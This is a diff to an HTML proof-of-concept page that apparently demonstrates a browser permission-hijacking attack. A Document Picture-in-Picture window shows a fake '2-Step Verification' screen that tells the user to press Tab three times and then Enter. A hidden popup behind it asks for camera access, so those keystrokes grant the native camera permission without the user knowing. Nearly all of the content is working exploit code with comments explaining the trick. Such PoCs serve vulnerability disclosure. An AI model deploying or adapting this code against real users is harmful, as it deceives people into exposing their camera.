@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Popup Overlap PoC</title>
+  <title>Document PiP Overlap PoC</title>
   <style>
     body {
       display: flex;
@@ -33,133 +33,136 @@
   </center>
   <button id="verify-btn">Verify</button>
   <script>
+    let pipWindow;
+    let popupWindow;
     document.getElementById('verify-btn').addEventListener('click', async () => {
-      // ── STEP 1: Open the SMALL permission popup (100x100) ──
-      // It loads permission.html which auto-requests camera.
-      // The browser's native "Allow camera?" prompt will appear on this window.
-      const permPopup = window.open(
-        'permission.html',
-        'permPopup',
-        'width=100,height=100,left=800,top=600'
-      );
-      // ── STEP 2: Open a LARGE overlay popup on top of it ──
-      // Opened AFTER the small one, so it's on top in the z-order.
-      // Positioned to fully cover the small popup.
-      const overlayPopup = window.open(
-        '',
-        'overlayPopup',
-        'width=640,height=500,left=600,top=400'
-      );
-      if (!overlayPopup) {
-        alert('Popup blocked! Please allow popups for this PoC.');
-        return;
-      }
-      // ── STEP 3: Inject the fake "verification" UI into the large popup ──
-      overlayPopup.document.write(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>Verification</title>
-          <style>
-            @keyframes pulse {
-              0%, 100% { opacity: 0.4; transform: scale(0.9); }
-              50%      { opacity: 1;   transform: scale(1.1); }
-            }
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-              display: flex;
-              flex-direction: column;
-              justify-content: center;
-              align-items: center;
-              height: 100vh;
-              background: #f0f0f0;
-              font-family: Arial, sans-serif;
-            }
-            h1 { font-size: 26px; color: #333; margin-bottom: 6px; }
-            .step-label { font-size: 22px; color: #0dd438; font-weight: bold; margin-bottom: 20px; }
-            .instruction { font-size: 18px; color: #222; text-align: center; line-height: 1.7; margin-bottom: 24px; }
-            .keys { display: flex; gap: 10px; align-items: center; margin-bottom: 24px; }
-            .key {
-              background: #fff; border: 2px solid #aaa; border-radius: 8px;
-              padding: 10px 18px; font-weight: bold; font-size: 15px; color: #333;
-              box-shadow: 0 2px 4px rgba(0,0,0,0.15); min-width: 50px; text-align: center;
-            }
-            .arrow { font-size: 20px; color: #999; }
-            .dot {
-              width: 18px; height: 18px; border-radius: 50%;
-              background: #0dd438; animation: pulse 1s ease-in-out infinite;
-              margin-bottom: 8px;
-            }
-            .sub { font-size: 13px; color: #888; }
-            .done { font-size: 30px; color: #0dd438; font-weight: bold; }
-          </style>
-        </head>
-        <body>
-          <h1>2-Step Verification</h1>
-          <div class="step-label" id="step-label">Step 1 of 2</div>
-          <div class="instruction" id="instr">
-            Press the <b>Tab</b> key 3 times,<br>then press <b>Enter</b> to continue.
-          </div>
-          <div class="keys" id="keys">
+      try {
+        // ── STEP 1: Open Document PiP window ──
+        // This is the ONLY web API that is:
+        // - Always on top (visually overlaps everything)
+        // - Does NOT steal keyboard focus from other windows
+        // So Tab/Enter keystrokes still reach the permission popup behind it.
+        pipWindow = await documentPictureInPicture.requestWindow({
+          width: 800,
+          height: 600,
+        });
+        // Inject styles
+        const style = pipWindow.document.createElement('style');
+        style.textContent = `
+          @keyframes pulse {
+            0%, 100% { opacity: 0.4; transform: scale(0.9); }
+            50%      { opacity: 1;   transform: scale(1.1); }
+          }
+          * { margin: 0; padding: 0; box-sizing: border-box; }
+          body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f0f0f0;
+            font-family: Arial, sans-serif;
+          }
+          h1 { font-size: 28px; color: #333; margin-bottom: 8px; }
+          .step-label { font-size: 22px; color: #0dd438; font-weight: bold; margin-bottom: 20px; }
+          .instruction { font-size: 20px; color: #222; text-align: center; line-height: 1.7; margin-bottom: 26px; }
+          .keys { display: flex; gap: 10px; align-items: center; margin-bottom: 26px; }
+          .key {
+            background: #fff; border: 2px solid #aaa; border-radius: 8px;
+            padding: 10px 20px; font-weight: bold; font-size: 16px; color: #333;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.15); min-width: 50px; text-align: center;
+          }
+          .arrow { font-size: 22px; color: #999; }
+          .dot {
+            width: 20px; height: 20px; border-radius: 50%;
+            background: #0dd438; animation: pulse 1s ease-in-out infinite;
+            margin-bottom: 10px;
+          }
+          .sub { font-size: 14px; color: #888; }
+          .done { font-size: 32px; color: #0dd438; font-weight: bold; }
+          #start-btn {
+            padding: 14px 32px; font-size: 17px; cursor: pointer;
+            background-color: #0dd438; color: white; border: none; border-radius: 5px;
+          }
+        `;
+        pipWindow.document.head.appendChild(style);
+        // ── Start button inside PiP ──
+        const startBtn = pipWindow.document.createElement('button');
+        startBtn.id = 'start-btn';
+        startBtn.textContent = 'Click to Start 2-Step Verification';
+        pipWindow.document.body.appendChild(startBtn);
+        // ── Step containers (hidden initially) ──
+        const stepLabel = createEl(pipWindow, 'div', 'step-label', '', 'none');
+        const instr = createEl(pipWindow, 'div', 'instruction', '', 'none');
+        const keys = createEl(pipWindow, 'div', 'keys', '', 'none');
+        const dot = createEl(pipWindow, 'div', 'dot', '', 'none');
+        const sub = createEl(pipWindow, 'div', 'sub', '', 'none');
+        // ── START: Open permission popup + show Step 1 ──
+        startBtn.addEventListener('click', () => {
+          // Open tiny permission popup BEHIND the PiP
+          // PiP stays on top visually, but this popup gets keyboard focus
+          popupWindow = window.open(
+            'permission.html',
+            'permPopup',
+            'width=100,height=100,left=850,top=650'
+          );
+          // Hide start button, show Step 1
+          startBtn.style.display = 'none';
+          stepLabel.style.display = 'block';
+          stepLabel.textContent = 'Step 1 of 2';
+          instr.style.display = 'block';
+          instr.innerHTML = 'Press the <b>Tab</b> key 3 times,<br>then press <b>Enter</b> to continue.';
+          keys.style.display = 'flex';
+          keys.innerHTML = `
             <div class="key">Tab</div>
             <div class="key">Tab</div>
             <div class="key">Tab</div>
             <span class="arrow">→</span>
             <div class="key">Enter</div>
-          </div>
-          <div class="dot" id="dot"></div>
-          <div class="sub" id="sub">Waiting for input…</div>
-        </body>
-        </html>
-      `);
-      overlayPopup.document.close();
-      // ── STEP 4: Keep the overlay popup on top ──
-      // Repeatedly refocus the overlay popup so it stays visually on top.
-      // The permission popup stays behind but its native prompt is still active.
-      const keepOnTop = setInterval(() => {
-        if (overlayPopup.closed) {
-          clearInterval(keepOnTop);
-          return;
-        }
-        overlayPopup.focus();
-      }, 200);
-      // ── STEP 5: After a moment, focus the PERMISSION popup for keystrokes ──
-      // We wait a bit for the overlay UI to render, then give keyboard focus
-      // to the permission popup ONCE. After that, the overlay keeps visual focus
-      // but the permission popup's native dialog can still receive Tab/Enter.
-      //
-      // NOTE: This is the core trick — the browser's native "Allow camera?"
-      // dialog can receive keystrokes even when not visually on top, because
-      // it's browser chrome, not page content.
-      // ── STEP 6: Detect when the permission popup closes itself ──
-      // permission.html auto-closes with window.close() after camera is granted.
-      const detectGrant = setInterval(() => {
-        if (permPopup && permPopup.closed) {
-          clearInterval(detectGrant);
-          clearInterval(keepOnTop);
-          // Show "Verified!" in the overlay
-          if (!overlayPopup.closed) {
-            const doc = overlayPopup.document;
-            doc.getElementById('step-label').textContent = '';
-            doc.getElementById('instr').innerHTML = '';
-            doc.getElementById('keys').innerHTML = '';
-            doc.getElementById('dot').style.display = 'none';
-            doc.getElementById('sub').textContent = '';
-            const done = doc.createElement('div');
+          `;
+          dot.style.display = 'block';
+          sub.style.display = 'block';
+          sub.textContent = 'Waiting for input…';
+        });
+        // ── Detect when permission popup closes (= camera granted) ──
+        const detectGrant = setInterval(() => {
+          if (popupWindow && popupWindow.closed) {
+            clearInterval(detectGrant);
+            popupWindow = null;
+            // Show "Verified!"
+            stepLabel.style.display = 'none';
+            instr.style.display = 'none';
+            keys.style.display = 'none';
+            dot.style.display = 'none';
+            sub.style.display = 'none';
+            const done = pipWindow.document.createElement('div');
             done.className = 'done';
             done.textContent = '✓ Verified!';
-            doc.body.innerHTML = '';
-            doc.body.style.display = 'flex';
-            doc.body.style.justifyContent = 'center';
-            doc.body.style.alignItems = 'center';
-            doc.body.style.height = '100vh';
-            doc.body.appendChild(done);
-            // Close overlay after a beat
-            setTimeout(() => overlayPopup.close(), 1500);
+            pipWindow.document.body.appendChild(done);
+            // Close PiP after showing verified
+            setTimeout(() => {
+              pipWindow.close();
+            }, 1500);
           }
-        }
-      }, 300);
+        }, 300);
+        // Clean up if PiP is manually closed
+        pipWindow.addEventListener('pagehide', () => {
+          clearInterval(detectGrant);
+          if (popupWindow && !popupWindow.closed) popupWindow.close();
+        });
+      } catch (error) {
+        console.error('Document PiP error:', error);
+        alert('Document PiP not supported in this browser. Use Chrome 116+.');
+      }
     });
+    function createEl(win, tag, className, text, display) {
+      const el = win.document.createElement(tag);
+      el.className = className;
+      el.textContent = text;
+      el.style.display = display;
+      win.document.body.appendChild(el);
+      return el;
+    }
   </script>
 </body>
 </html>
